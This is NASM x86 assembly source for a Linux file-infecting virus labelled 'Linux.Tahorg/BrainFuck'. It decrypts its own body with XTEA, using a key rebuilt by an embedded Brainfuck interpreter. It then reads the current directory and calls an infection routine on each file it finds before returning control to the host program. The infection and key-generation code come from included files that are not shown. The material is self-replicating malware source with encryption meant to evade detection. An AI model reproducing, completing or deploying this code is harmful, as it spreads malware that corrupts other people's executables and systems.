		BITS	32
		CPU	586
		global	_start
		
%define	O(L)	(L - virus_begin)
%include	'include/tahorg.inc'

_start:		call	virus_jmp

		mov	eax, 1
		mov	ebx, 0
		int	0x80

subr:		mov	eax, 4
		mov	ebx, 1
		lea	ecx, [message]
		mov	edx, msglen
		int	0x80
		ret

message		db	"Host programm continue execution", 0x0a
msglen		equ	$ - message
		align	16

; fake virus prologue (instead of decryption)
virus_jmp:	push	byte 0
		pushf
		pusha
		jmp	virus_start
;------------------------------------------------------------------------------
virus_begin:	push	byte 0
		pushf
		pusha
		
		call	.geta
.geta:		pop	ebp
		lea	ebp, [ebp - O(.geta)]		

		sub	esp, 1024
		mov	edi, esp
; edi = core
		
		push	edi
		xor	eax, eax
		mov	ecx, 256
		rep	stosd
		pop	edi
		
		lea	esi, [ebp + O(virus_end)]	; code
		push	0				; putchar
		push	0				; getchar
		push	edi				; core
		push	esi				; code
		call	bf
		add	esp, 16

		lea	esi, [ebp + O(virus_start)]
		mov	ecx, ((virus_end - virus_start) / 8)

;	push edi
;	call print_key
		
	.do:	push	edi				; key
		push	esi				; buf
		call	XTEA_Decipher
		add	esi, 8
		loop	.do
	
		add	esp, 1024
		jmp	virus_start

bf:		incbin		'bfi.bin'
		%include	'xtea.inc'
		%include	'xtea_decipher.asm'
;		%include	"print_key.asm"
		align	8
;------------------------------------------------------------------------------
virus_start:
		mov	edx, (DIRENT_SIZE + IBUFFER_SIZE)
		sub	esp, edx
		mov	ebx, esp
		mov	word [ebx], 0x2e		; "."
		movb	eax, 5
		movb	ecx, 0				; O_RDONLY
		int	0x80				; open
		or	eax, eax
		js	.all_done

		xchg	eax, ebx

.read_dir:	mov	ecx, esp
		movb	eax, 89
		int	0x80				; readdir
		dec	eax
		jnz	.all_done

		lea	eax, [esp + DIRENT_DNAME]
		lea	ecx, [esp + DIRENT_SIZE]
		push	ecx
		push	eax
		call	infect_file
		dec	eax
		jnz	.read_dir

.all_done:	add	esp, edx
		movb	eax, 6
		int	0x80				; close

.return:	mov	eax, [esp + 40]
		mov	ebx, strict dword (subr - _start - 5)
calladdr	equ	$ - 4
		lea	eax, [eax + ebx]
		mov	[esp + 36], eax

		popa
		popf
		ret

get_addr:	call	.get
.get:		pop	eax
		sub	eax, O(get_addr.get)
		ret

		%include 'infect.asm'
		%include 'mk_key.asm'
		%include 'xtea_encipher.asm'
name		db	"Linux.Tahorg/BrainFuck"
		align	8
;------------------------------------------------------------------------------		
virus_end:
VIRUS_SIZE	equ	O($)
